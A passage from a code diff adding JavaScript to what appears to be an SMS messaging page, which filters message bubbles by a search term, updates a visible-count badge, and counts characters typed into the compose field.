+                    var text = b.textContent.toLowerCase();
+                    if (!q || text.indexOf(q) !== -1) {
+                        b.style.display = '';
+                        visible++;
+                    } else {
+                        b.style.display = 'none';
+                    }
+                });
+
+                if (emptySearch) {
+                    emptySearch.style.display = (visible === 0 && bubbles.length > 0) ? 'block' : 'none';
+                }
+
+                if (countBadge) {
+                    var icon = countBadge.querySelector('i.icon');
+                    var iconHTML = icon ? icon.outerHTML : '';
+                    countBadge.innerHTML = iconHTML + ' ' + visible;
+                }
+            });
+        }
+
+        /* Character count for compose */
+        var smsInput = document.getElementById('sms');
+        var charCount = document.getElementById('smsCharCount');
+        if (smsInput && charCount) {
+            smsInput.addEventListener('input', function () {
+                charCount.textContent = this.value.length;
+            });
+        }
+    })();
+</script>
